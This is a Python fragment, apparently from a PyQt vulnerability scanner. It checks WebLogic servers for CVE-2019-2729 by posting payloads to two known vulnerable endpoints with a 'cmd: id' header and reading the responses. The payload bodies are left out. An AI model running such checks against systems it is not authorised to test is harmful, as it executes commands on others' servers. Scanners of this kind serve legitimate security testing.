...
class CVE20192729(QThread):
    headers = {'user-agent': 'ceshi/0.0.1', 'content-type': 'text/xml', 'cmd': 'id'}
    VUL = 'CVE-2019-2729'
    path = '/wls-wsat/CoordinatorPortType'
    path1 = '/_async/AsyncResponseService'
    payload = '''
    ...
    def run(self):
        try:
            r=requests.post('http://'+ str(self.ip) + ':' + str(self.port) + self.path,headers=self.headers,data=self.payload,timeout=15)
            time.sleep(2)
            r2=requests.post('http://'+ str(self.ip) + ':' + str(self.port) + self.path1,headers=self.headers,data=self.payload2,timeout=15)
            time.sleep(2)
            r3=requests.get('http://'+ str(self.ip) + ':' + str(self.port) + '/_async/favicon.ico')
            #print(r.status_code)
            if((r.status_code==200) and 'uid' in r.text) or ((r2.status_code == 202) and 'Vulnerable' in r3.text):
                self.signal[str, str].emit("[+] CVE-2019-2729 漏洞存在", 'red')
            else:
                self.signal[str, str].emit("[-] CVE-2019-2729 漏洞不存在", 'green')
        except:
            self.signal[str, str].emit("[-] CVE-2019-2729 连接拒绝", 'green')